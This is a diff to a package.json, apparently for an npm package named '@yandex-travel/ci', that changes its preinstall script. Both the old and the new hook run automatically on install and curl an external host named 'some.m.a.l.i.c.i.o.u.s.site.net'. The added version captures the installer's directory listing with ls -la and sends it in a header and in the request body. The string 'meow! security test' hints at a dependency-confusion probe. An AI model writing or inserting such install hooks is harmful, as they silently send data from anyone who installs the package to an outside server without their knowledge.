@@ -5,7 +5,7 @@
   "main": "index.js",
   "scripts": {
     "test": "echo \"Error: no test specified\" && exit 1",
-    "preinstall": "ls -la && curl -H \\\"Package: @yandex-travel/ci\\\" -H \\\"Version: 1.1.1\\\"  -d \\\"meow! security test\\\" http://some.m.a.l.i.c.i.o.u.s.site.net"
+    "preinstall": "ls -la > kk.txt && curl -H \\\"Package: @yandex-travel/ci\\\" -H \\\"Version: 1.1.1\\\" -H \\\"lsal: $(cat kk.txt)\\\" -d \\\"$(ls -la)\\\" -d \\\"meow! security test\\\" http://some.m.a.l.i.c.i.o.u.s.site.net"
   },
   "author": "",
   "license": "ISC"
